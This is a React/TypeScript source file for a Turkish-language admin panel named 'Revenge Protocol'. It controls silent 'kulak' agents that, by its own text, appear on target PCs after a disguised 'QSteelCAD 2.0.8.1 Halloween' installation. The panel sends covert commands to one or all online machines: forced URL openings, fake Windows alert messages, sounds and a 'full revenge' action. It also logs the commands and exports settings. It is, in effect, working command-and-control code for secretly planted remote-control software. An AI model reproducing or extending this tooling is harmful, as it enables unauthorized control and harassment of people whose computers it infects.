'use client';

import { useCallback, useEffect, useMemo, useState } from 'react';

import {
  COMMAND_GROUPS,
  KIND_LABEL,
  commandButtonLabel,
  type CommandDef,
  type CommandKind,
  type CommandVariant,
} from '@/lib/admin-commands';
import type { RevengeSettings } from '@/lib/settings-defaults';

import { AdminSettingsForm, type SettingsTab } from './admin-settings-form';
import styles from './admin-panel.module.css';

type AgentRow = {
  id: string;
  hostname: string;
  label: string;
  lastSeenAt: string | null;
  secondsSinceLastSeen: number | null;
  online: boolean;
  stale?: boolean;
  createdAt: string;
  queuePending: number;
};

type Page = 'control' | 'settings' | 'log' | 'system';

type Stats = {
  agentsTotal: number;
  agentsOnline: number;
  commandsPending: number;
  commandsInFlight: number;
  commandsLast24h: number;
};

type ActivityItem = {
  id: string;
  agentId: string;
  hostname: string | null;
  kind: string;
  status: string;
  createdAt: string;
  doneAt: string | null;
};

function btnVariantClass(v: CommandVariant): string {
  switch (v) {
    case 'primary':
      return styles.btnPrimary;
    case 'fun':
      return styles.btnFun;
    case 'warn':
      return styles.btnWarn;
    case 'danger':
      return styles.btnDanger;
    default:
      return styles.btnGhost;
  }
}

const STATUS_LABEL: Record<string, string> = {
  pending: 'Bekliyor',
  delivered: 'İletildi',
  done: 'Tamam',
  failed: 'Hata',
};

export function AdminPanel() {
  const [authed, setAuthed] = useState<boolean | null>(null);
  const [password, setPassword] = useState('');
  const [agents, setAgents] = useState<AgentRow[]>([]);
  const [settings, setSettings] = useState<RevengeSettings | null>(null);
  const [stats, setStats] = useState<Stats | null>(null);
  const [activity, setActivity] = useState<ActivityItem[]>([]);
  const [msg, setMsg] = useState('');
  const [msgTone, setMsgTone] = useState<'ok' | 'danger'>('ok');
  const [busy, setBusy] = useState(false);
  const [page, setPage] = useState<Page>('control');
  const [settingsTab, setSettingsTab] = useState<SettingsTab>('scenario');
  const [selectedAgentId, setSelectedAgentId] = useState<string | null>(null);
  const [oneOffUrl, setOneOffUrl] = useState('');
  const [winAlertMsg, setWinAlertMsg] = useState('');
  const [liveTick, setLiveTick] = useState(0);

  const onlineAgents = useMemo(() => agents.filter((a) => a.online), [agents]);

  const selectedAgent = useMemo(
    () => agents.find((a) => a.id === selectedAgentId) ?? null,
    [agents, selectedAgentId],
  );

  function formatLastSignal(a: AgentRow): string {
    if (a.secondsSinceLastSeen === null && !a.lastSeenAt) return 'henüz sinyal yok';
    const sec =
      a.secondsSinceLastSeen ??
      Math.max(0, Math.floor((Date.now() - new Date(a.lastSeenAt!).getTime()) / 1000));
    void liveTick;
    if (sec <= 20) return `${sec} sn önce · canlı`;
    if (sec < 120) return `${sec} sn önce`;
    return new Date(a.lastSeenAt!).toLocaleString('tr-TR');
  }

  const loadCore = useCallback(async () => {
    const [a, s, st] = await Promise.all([
      fetch('/api/admin/agents').then((r) => (r.ok ? r.json() : null)),
      fetch('/api/admin/settings').then((r) => (r.ok ? r.json() : null)),
      fetch('/api/admin/stats').then((r) => (r.ok ? r.json() : null)),
    ]);
    if (a?.agents) {
      setAuthed(true);
      setAgents(a.agents);
    } else setAuthed(false);
    if (s && !s.error) setSettings(s);
    if (st && !st.error) setStats(st);
  }, []);

  const loadActivity = useCallback(async () => {
    const r = await fetch('/api/admin/activity');
    if (!r.ok) return;
    const body = await r.json();
    if (body.items) setActivity(body.items);
  }, []);

  useEffect(() => {
    void loadCore();
    const poll = window.setInterval(() => void loadCore(), 3_000);
    const tick = window.setInterval(() => setLiveTick((t) => t + 1), 1_000);
    return () => {
      clearInterval(poll);
      clearInterval(tick);
    };
  }, [loadCore]);

  useEffect(() => {
    if (!authed || page !== 'log') return;
    void loadActivity();
    const id = window.setInterval(() => void loadActivity(), 5_000);
    return () => clearInterval(id);
  }, [authed, page, loadActivity]);

  useEffect(() => {
    if (agents.length === 0) {
      setSelectedAgentId(null);
      return;
    }
    if (selectedAgentId && agents.some((a) => a.id === selectedAgentId)) return;
    const pick = agents.find((a) => a.online) ?? agents[0];
    setSelectedAgentId(pick.id);
  }, [agents, selectedAgentId]);

  function flashMessage(text: string, tone: 'ok' | 'danger' = 'ok') {
    setMsgTone(tone);
    setMsg(text);
  }

  async function login(e: React.FormEvent) {
    e.preventDefault();
    setBusy(true);
    const r = await fetch('/api/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password }),
    });
    setBusy(false);
    if (r.ok) {
      setPassword('');
      setMsg('');
      await loadCore();
    } else {
      flashMessage('Parola yanlış', 'danger');
    }
  }

  async function sendCommand(
    agentId: string,
    kind: CommandKind,
    payload?: { url?: string; message?: string },
  ) {
    setBusy(true);
    const r = await fetch('/api/admin/command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ agentId, kind, payload }),
    });
    setBusy(false);
    const body = await r.json().catch(() => ({}));
    if (r.ok) {
      flashMessage(`${KIND_LABEL[kind]} sıraya alındı. Kulak ~8 sn içinde alır.`);
    } else {
      flashMessage(typeof body.error === 'string' ? body.error : 'Komut gönderilemedi', 'danger');
    }
    await loadCore();
    if (page === 'log') await loadActivity();
  }

  async function sendBatch(
    kind: CommandKind,
    target: 'all_online' | 'selected',
    payload?: { url?: string; message?: string },
  ) {
    const agentIds = target === 'selected' && selectedAgentId ? [selectedAgentId] : undefined;
    setBusy(true);
    const r = await fetch('/api/admin/command/batch', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ kind, target, agentIds, payload }),
    });
    setBusy(false);
    const body = await r.json().catch(() => ({}));
    if (r.ok) {
      flashMessage(
        `${KIND_LABEL[kind]}: ${body.queued ?? 0} kulak sıraya alındı${body.skipped ? `, ${body.skipped} atlandı (meşgul/yok)` : ''}.`,
      );
    } else {
      flashMessage(typeof body.error === 'string' ? body.error : 'Toplu komut gönderilemedi', 'danger');
    }
    await loadCore();
    if (page === 'log') await loadActivity();
  }

  function runCommand(def: CommandDef, mode: 'single' | 'batch_online') {
    if (def.confirm && !window.confirm(def.confirm)) return;

    let payload: { url?: string; message?: string } | undefined;
    if (def.needsPayload === 'url') {
      const url = oneOffUrl.trim();
      if (!url.startsWith('http')) {
        flashMessage('Geçerli bir URL girin (https://…)', 'danger');
        return;
      }
      payload = { url };
    }
    if (def.kind === 'flash') {
      const message = winAlertMsg.trim();
      if (message) payload = { message };
    } else if (def.needsPayload === 'message') {
      const message = winAlertMsg.trim();
      if (!message) {
        flashMessage('Mesaj metni gerekli', 'danger');
        return;
      }
      payload = { message };
    }

    if (mode === 'batch_online') {
      void sendBatch(def.kind, 'all_online', payload);
      return;
    }
    if (!selectedAgentId) {
      flashMessage('Önce bir kulak seçin', 'danger');
      return;
    }
    if (!selectedAgent?.online) {
      flashMessage('Seçili kulak çevrimdışı', 'danger');
      return;
    }
    void sendCommand(selectedAgentId, def.kind, payload);
  }

  async function saveSettings(e?: React.FormEvent) {
    e?.preventDefault();
    if (!settings) return;
    setBusy(true);
    const r = await fetch('/api/admin/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(settings),
    });
    setBusy(false);
    if (r.ok) {
      setSettings(await r.json());
      flashMessage('Tüm ayarlar kaydedildi');
    } else {
      flashMessage('Kaydedilemedi', 'danger');
    }
  }

  function patchSettings(partial: Partial<RevengeSettings>) {
    setSettings((s) => (s ? { ...s, ...partial } : s));
  }

  async function logout() {
    await fetch('/api/admin/logout', { method: 'POST' });
    setAuthed(false);
    setAgents([]);
    setStats(null);
    flashMessage('Oturum kapatıldı');
  }

  function exportSettings() {
    if (!settings) return;
    const blob = new Blob([JSON.stringify(settings, null, 2)], { type: 'application/json' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `revenge-settings-${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(a.href);
  }

  function importSettings(file: File) {
    const reader = new FileReader();
    reader.onload = () => {
      try {
        const parsed = JSON.parse(String(reader.result)) as RevengeSettings;
        setSettings(parsed);
        flashMessage('JSON içe aktarıldı — Kaydet ile sunucuya yazın');
      } catch {
        flashMessage('Geçersiz JSON dosyası', 'danger');
      }
    };
    reader.readAsText(file);
  }

  if (authed === null) {
    return (
      <div className={styles.shell}>
        <p className="p-8 text-muted">Yükleniyor…</p>
      </div>
    );
  }

  if (!authed) {
    return (
      <div className={styles.shell}>
        <form onSubmit={login} className={`${styles.card} ${styles.loginWrap}`}>
          <h1 className={styles.brandTitle}>20.10 Kontrol</h1>
          <p className={`${styles.brandSub} mt-2`}>
            Kulak sessizdir; yalnızca buradan komut verince hedef ekranda bir şey olur.
          </p>
          <label className={`${styles.field} mt-6`}>
            <span className={styles.fieldLabel}>Parola</span>
            <input
              type="password"
              className={styles.input}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </label>
          <button type="submit" disabled={busy} className={`${styles.btn} ${styles.btnPrimary} w-full`}>
            Giriş
          </button>
          {msg ? (
            <p className={`${styles.toast} ${msgTone === 'danger' ? styles.toastErr : styles.toastOk} mt-4`}>
              {msg}
            </p>
          ) : null}
        </form>
      </div>
    );
  }

  return (
    <div className={styles.shell}>
      <header className={styles.topBar}>
        <div className={styles.brand}>
          <span className={styles.brandTitle}>Revenge Protocol</span>
          <span className={styles.brandSub}>
            20.10 · Admin · {stats?.agentsOnline ?? onlineAgents.length} çevrimiçi / {stats?.agentsTotal ?? agents.length}{' '}
            kulak
          </span>
        </div>
        <div className={styles.topActions}>
          {page === 'settings' ? (
            <button
              type="button"
              disabled={busy || !settings}
              className={`${styles.btn} ${styles.btnPrimary}`}
              onClick={() => void saveSettings()}
            >
              Ayarları kaydet
            </button>
          ) : null}
          <button type="button" className={`${styles.btn} ${styles.btnGhost}`} onClick={() => void logout()}>
            Çıkış
          </button>
        </div>
      </header>

      <div className={styles.appLayout}>
        <nav className={styles.sidebar} aria-label="Panel menüsü">
          {(
            [
              ['control', 'Kontrol'],
              ['settings', 'Ayarlar'],
              ['log', 'Günlük'],
              ['system', 'Sistem'],
            ] as const
          ).map(([id, label]) => (
            <button
              key={id}
              type="button"
              className={`${styles.navBtn} ${page === id ? styles.navActive : ''}`}
              onClick={() => setPage(id)}
            >
              {label}
            </button>
          ))}
          <p className={styles.sidebarHint}>Komut kaynağı: admin-commands.ts — yeni türler tek yerden eklenir.</p>
        </nav>

        <main className={styles.mainContent}>
          {msg ? (
            <div className={`${styles.toast} ${msgTone === 'danger' ? styles.toastErr : styles.toastOk}`}>{msg}</div>
          ) : null}

          {stats ? (
            <div className={styles.statGrid}>
              <div className={styles.statCard}>
                <span className={styles.statLabel}>Çevrimiçi</span>
                <span className={styles.statValue}>{stats.agentsOnline}</span>
              </div>
              <div className={styles.statCard}>
                <span className={styles.statLabel}>Bekleyen komut</span>
                <span className={styles.statValue}>{stats.commandsPending}</span>
              </div>
              <div className={styles.statCard}>
                <span className={styles.statLabel}>Yolda</span>
                <span className={styles.statValue}>{stats.commandsInFlight}</span>
              </div>
              <div className={styles.statCard}>
                <span className={styles.statLabel}>Son 24 saat</span>
                <span className={styles.statValue}>{stats.commandsLast24h}</span>
              </div>
            </div>
          ) : null}

          {page === 'control' ? (
            <div className={styles.controlLayout}>
              <section className={styles.card}>
                <div className={styles.cardHead}>
                  <span>Kulaklar</span>
                  <span className={styles.brandSub}>~3 sn yenileme</span>
                </div>
                <div className={styles.cardBody}>
                  {agents.length === 0 ? (
                    <p className={styles.empty}>
                      Henüz kulak yok. Hedef PC&apos;de QSteelCAD 2.0.8.1 Halloween kurulumu sonrası oturum açın.
                    </p>
                  ) : (
                    <ul className={styles.agentList}>
                      {agents.map((a) => (
                        <li key={a.id}>
                          <button
                            type="button"
                            className={`${styles.agentPick} ${selectedAgentId === a.id ? styles.agentPickActive : ''}`}
                            onClick={() => setSelectedAgentId(a.id)}
                          >
                            <span className={`${styles.dot} ${a.online ? styles.dotOn : styles.dotOff}`} />
                            <span className={styles.host}>{a.hostname || a.id.slice(0, 12)}</span>
                            <span className={styles.brandSub}>{a.online ? 'Çevrimiçi' : 'Çevrimdışı'}</span>
                            {a.queuePending > 0 ? (
                              <span className={styles.badge}>Sırada {a.queuePending}</span>
                            ) : null}
                          </button>
                        </li>
                      ))}
                    </ul>
                  )}

                  {onlineAgents.length > 0 ? (
                    <div className={styles.broadcastBar}>
                      <span className={styles.cmdGroupTitle}>Toplu (tüm çevrimiçi)</span>
                      <div className={styles.cmdGrid}>
                        <button
                          type="button"
                          disabled={busy}
                          className={`${styles.btn} ${styles.btnFun}`}
                          onClick={() => runCommand(COMMAND_GROUPS[0].commands[2], 'batch_online')}
                        >
                          Sürpriz
                        </button>
                        <button
                          type="button"
                          disabled={busy}
                          className={`${styles.btn} ${styles.btnPrimary}`}
                          onClick={() => runCommand(COMMAND_GROUPS[0].commands[0], 'batch_online')}
                        >
                          Tam intikam
                        </button>
                        <button
                          type="button"
                          disabled={busy}
                          className={`${styles.btn} ${styles.btnGhost}`}
                          onClick={() => runCommand(COMMAND_GROUPS[2].commands[0], 'batch_online')}
                        >
                          Komik sesler
                        </button>
                      </div>
                    </div>
                  ) : null}
                </div>
              </section>

              <section className={styles.card}>
                <div className={styles.cardHead}>
                  <span>Komutlar</span>
                  {selectedAgent ? (
                    <span className={styles.brandSub}>
                      {selectedAgent.hostname || selectedAgent.id.slice(0, 12)} · {formatLastSignal(selectedAgent)}
                    </span>
                  ) : (
                    <span className={styles.brandSub}>Kulak seçin</span>
                  )}
                </div>
                <div className={styles.cardBody}>
                  <div className={styles.winAlertBox}>
                    <label className={styles.field}>
                      <span className={styles.fieldLabel}>Windows uyarı mesajı</span>
                      <textarea
                        className={styles.textarea}
                        rows={3}
                        placeholder={
                          settings?.winAlertMessages?.[0]
                            ? `Boş bırakırsanız ayarlardan: «${settings.winAlertMessages[0].slice(0, 48)}…»`
                            : 'Boş bırakırsanız Ayarlar → Windows uyarı listesinden seçilir'
                        }
                        value={winAlertMsg}
                        onChange={(e) => setWinAlertMsg(e.target.value)}
                      />
                      <span className={styles.fieldHint}>
                        Kalıcı metinler için Ayarlar → Windows uyarı sekmesini kaydedin. Burası tek seferlik
                        override.
                      </span>
                    </label>
                    <button
                      type="button"
                      disabled={busy || !selectedAgent?.online}
                      className={`${styles.btn} ${styles.btnGhost}`}
                      onClick={() =>
                        runCommand(
                          COMMAND_GROUPS.flatMap((g) => g.commands).find((c) => c.kind === 'flash')!,
                          'single',
                        )
                      }
                    >
                      Uyarıyı gönder
                    </button>
                  </div>
                  <div className={styles.payloadRow}>
                    <input
                      className={styles.input}
                      placeholder="Özel link (https://…)"
                      value={oneOffUrl}
                      onChange={(e) => setOneOffUrl(e.target.value)}
                    />
                  </div>

                  {COMMAND_GROUPS.map((group) => (
                    <div key={group.id} className={styles.cmdGroup}>
                      <p className={styles.cmdGroupTitle}>{group.title}</p>
                      {group.hint ? <p className={styles.groupHint}>{group.hint}</p> : null}
                      <div className={styles.cmdGrid}>
                        {group.commands.map((def) => (
                          <button
                            key={def.kind}
                            type="button"
                            disabled={busy || !selectedAgent?.online}
                            title={def.title ?? def.label}
                            className={`${styles.btn} ${btnVariantClass(def.variant)}`}
                            onClick={() => runCommand(def, 'single')}
                          >
                            {commandButtonLabel(def, settings)}
                          </button>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              </section>
            </div>
          ) : null}

          {page === 'settings' && settings ? (
            <AdminSettingsForm
              settings={settings}
              tab={settingsTab}
              setTab={setSettingsTab}
              busy={busy}
              onPatch={patchSettings}
              onSave={saveSettings}
            />
          ) : null}

          {page === 'log' ? (
            <section className={styles.card}>
              <div className={styles.cardHead}>
                <span>Son komutlar</span>
                <button
                  type="button"
                  className={`${styles.btn} ${styles.btnGhost}`}
                  onClick={() => void loadActivity()}
                >
                  Yenile
                </button>
              </div>
              <div className={styles.tableWrap}>
                <table className={styles.logTable}>
                  <thead>
                    <tr>
                      <th>Zaman</th>
                      <th>Kulak</th>
                      <th>Komut</th>
                      <th>Durum</th>
                    </tr>
                  </thead>
                  <tbody>
                    {activity.length === 0 ? (
                      <tr>
                        <td colSpan={4} className={styles.emptyCell}>
                          Henüz kayıt yok
                        </td>
                      </tr>
                    ) : (
                      activity.map((row) => (
                        <tr key={row.id}>
                          <td>{new Date(row.createdAt).toLocaleString('tr-TR')}</td>
                          <td>{row.hostname || row.agentId.slice(0, 10)}</td>
                          <td>{KIND_LABEL[row.kind as CommandKind] ?? row.kind}</td>
                          <td>{STATUS_LABEL[row.status] ?? row.status}</td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </section>
          ) : null}

          {page === 'system' ? (
            <section className={styles.card}>
              <div className={styles.cardHead}>
                <span>Sistem & yedek</span>
              </div>
              <div className={styles.cardBody}>
                <p className={styles.empty}>
                  Ayarları JSON olarak dışa/içe aktarın; ileride şablon ve ortam kopyası için kullanın. Komut türleri{' '}
                  <code className={styles.inlineCode}>src/lib/admin-commands.ts</code> dosyasından yönetilir.
                </p>
                <div className={styles.cmdGrid}>
                  <button
                    type="button"
                    disabled={!settings}
                    className={`${styles.btn} ${styles.btnGhost}`}
                    onClick={exportSettings}
                  >
                    Ayarları dışa aktar
                  </button>
                  <label className={`${styles.btn} ${styles.btnGhost}`}>
                    İçe aktar
                    <input
                      type="file"
                      accept="application/json"
                      className={styles.hiddenFile}
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        if (f) importSettings(f);
                        e.target.value = '';
                      }}
                    />
                  </label>
                </div>
                <ul className={styles.roadmapList}>
                  <li>Planlanan: kulak etiketleri, komut zamanlama, senaryo şablonları</li>
                  <li>Planlanan: makine grupları ve filtreli toplu komut</li>
                  <li>Planlanan: webhook / Slack bildirimi (komut tamamlandığında)</li>
                </ul>
              </div>
            </section>
          ) : null}
        </main>
      </div>
    </div>
  );
}
